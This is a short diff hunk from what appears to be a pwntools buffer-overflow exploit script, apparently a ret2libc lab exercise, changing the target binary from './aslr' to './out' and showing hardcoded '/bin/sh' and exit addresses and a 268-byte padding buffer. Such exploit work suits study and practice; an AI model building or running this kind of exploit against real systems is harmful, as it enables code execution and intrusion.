@@ -7,7 +7,7 @@ binsh = 0xf7f59352
 #p exit
 exit = 0xf7dff170
 
-p = process("./aslr");
+p = process("./out");
 buff_len = 268
 #Fill the buffer
 buff = b'\x42'*buff_len
